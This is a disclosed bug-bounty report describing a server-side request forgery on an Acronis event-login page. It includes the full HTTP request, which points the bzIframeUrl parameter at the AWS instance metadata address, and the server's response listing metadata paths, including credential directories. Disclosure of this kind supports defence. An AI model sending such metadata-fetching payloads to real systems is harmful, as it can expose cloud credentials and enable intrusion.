# FULL SSRF 

## Report Details
- **Report ID**: 1241149
- **URL**: https://hackerone.com/reports/1241149
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-06-22T13:57:44.662Z
- **Disclosed**: 2022-02-22T09:09:11.877Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
hello dear support

i have found full ssrf  on https://summit.acronis.events

step

go to here https://summit.acronis.events
2 login into website
3 open this link 
https://summit.acronis.events/login/wl?bzIframeUrl=ls&eventGroup=31048&eventId=228513&encryptedOrigin=1%3APXwmTfsOX5swR5WLWW1hEcWFR24vg2RCT1aflJJNM%2BchgNaRQ2fSRv7QJX3Ro27uTjR%2BUzV0z1s3siiObx%2BOHQ%3D%3D&screen=PROFILE_FULL&closable=false&emailLoginRedirectUrl=https%3A%2F%2Fsummit.acronis.events%2Fsettings%2Fprofile&colorMain=%2362a4f7&showChangeEmail=true&showTitle=false&encryptedTokens=1%3AIqgWUC4KnRXhJjI%2Bh4Hr1qbBFa%2FF3CT1SYs5Uv0s6S6ujzX%2FeGjQpYoJiqxy4un688xsXJXHC0CefbCMT724MnJxY%2BPoWfg3UO%2FHX49FTANq%2Fe9cyA%2BXlhLeAn7gWIAyZzg4RNnSwO0OEi%2FcFx5ozg%3D%3D&enableTicketIdLogin=true&enableFullStory=true&restrictLoginWithoutRegistration=true&IBMBannedCountries=false

this parameter injectable bzIframeUrl=ls


http request
===============
GET /login/wl?bzIframeUrl=http%3a%2f%2f169%2e254%2e169%2e254%2flatest%2fmeta-data%2f&eventGroup=31048&eventId=228513&encryptedOrigin=1%3APXwmTfsOX5swR5WLWW1hEcWFR24vg2RCT1aflJJNM%2BchgNaRQ2fSRv7QJX3Ro27uTjR%2BUzV0z1s3siiObx%2BOHQ%3D%3D&screen=PROFILE_FULL&closable=false&emailLoginRedirectUrl=https%3A%2F%2Fsummit.acronis.events%2Fsettings%2Fprofile&colorMain=%2362a4f7&showChangeEmail=true&showTitle=false&encryptedTokens=1%3AIqgWUC4KnRXhJjI%2Bh4Hr1qbBFa%2FF3CT1SYs5Uv0s6S6ujzX%2FeGjQpYoJiqxy4un688xsXJXHC0CefbCMT724MnJxY%2BPoWfg3UO%2FHX49FTANq%2Fe9cyA%2BXlhLeAn7gWIAyZzg4RNnSwO0OEi%2FcFx5ozg%3D%3D&enableTicketIdLogin=true&enableFullStory=true&restrictLoginWithoutRegistration=true&IBMBannedCountries=false HTTP/1.1
Host: summit.acronis.events
Cookie: x-bz-refresh-attendee-token=1f20fffa-1d8c-4506-9cb1-a5a45f211f98; _sp_id.880c=7fe0ad97-2770-41fa-b581-7ecb70330cec.1624293618.2.1624368877.1624293618.393f9cc8-7a6d-47f4-a5b1-5667891dbdfc; fs_uid=rs.fullstory.com#1lwN#6586826684178432:5558978104074240/1655904977; _sp_ses.880c=*; refiner_cookie_uuid=dafb40af-1b5f-b6da-e439-44379b6fe8d2; x-bz-access-attendee-token=78d438e2-446e-447b-9701-84df313b7afb; bz-attendee-at-31048=b19ff262-eb59-4c1d-b9ab-b0a398aed822; bz-attendee-rt-31048=1f20fffa-1d8c-4506-9cb1-a5a45f211f98; bz-cookie=s%3Ah9Fq6WM7rbO2DmPtL8HE5O5rGnJUUDMh.duF44pXpFqemhkeLQ10i6QnONcYY1niJ90uEeEWAGfo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close


response 
=-===========
HTTP/1.1 200 OK
Server: openresty
Date: Tue, 22 Jun 2021 13:49:41 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 290
Connection: close
Server-Timing: intid;desc=44ca21115b28a77e
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-XSS-Protection: 0
ETag: W/"122-ylO3hCR8VY9AkhBnM/tMCD6Vh+c"
Set-Cookie: bz-cookie=s%3AeNtrIjUGQkT3ykpQRgS8-5S4Yf_XouuP.CjKPzKvsH0H6QSc8T%2Fsfnan2TgGjuZamvg3prcS%2BOnE; Path=/; Expires=Tue, 22 Jun 2021 13:54:41 GMT; HttpOnly; Secure; SameSite=None
Vary: Accept-Encoding
Expires: Tue, 22 Jun 2021 13:49:40 GMT
Cache-Control: no-cache

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-keys/
reservation-id
security-groups
services/


full url :https://summit.acronis.events/login/wl?bzIframeUrl=http%3a%2f%2f169%2e254%2e169%2e254%2flatest%2fmeta-data%2f&eventGroup=31048&eventId=228513&encryptedOrigin=1%3APXwmTfsOX5swR5WLWW1hEcWFR24vg2RCT1aflJJNM%2BchgNaRQ2fSRv7QJX3Ro27uTjR%2BUzV0z1s3siiObx%2BOHQ%3D%3D&screen=PROFILE_FULL&closable=false&emailLoginRedirectUrl=https%3A%2F%2Fsummit.acronis.events%2Fsettings%2Fprofile&colorMain=%2362a4f7&showChangeEmail=true&showTitle=false&encryptedTokens=1%3AIqgWUC4KnRXhJjI%2Bh4Hr1qbBFa%2FF3CT1SYs5Uv0s6S6ujzX%2FeGjQpYoJiqxy4un688xsXJXHC0CefbCMT724MnJxY%2BPoWfg3UO%2FHX49FTANq%2Fe9cyA%2BXlhLeAn7gWIAyZzg4RNnSwO0OEi%2FcFx5ozg%3D%3D&enableTicketIdLogin=true&enableFullStory=true&restrictLoginWithoutRegistration=true&IBMBannedCountries=false

## Impact

SSRF

## Attachments
No attachments
